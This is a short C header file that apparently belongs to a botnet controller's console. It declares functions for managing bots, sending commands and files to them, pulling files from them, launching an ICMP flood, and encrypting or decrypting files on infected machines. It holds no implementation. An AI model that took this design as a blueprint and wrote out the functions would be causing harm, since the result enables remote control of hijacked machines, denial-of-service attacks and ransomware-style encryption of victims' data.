#ifndef CONSOLE_H
#define CONSOLE_H

#include "../lib/cJSON.h"

void *interactive_menu();
static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp);
void display_bots();
void get_file_from_bot();
void send_file_to_bot();
void send_command_to_bot();
void get_bot_file();
void print_wrapped(int start_row, int start_col, const char *format, ...);
bool handle_scrolling_and_quitting(int *start_line, int total_lines, int display_lines);
void reconstruct_lines(cJSON *output);
void update_bots();
void icmp_flood();
void encrypt_file_on_bot();
void decrypt_file_on_bot();

#endif
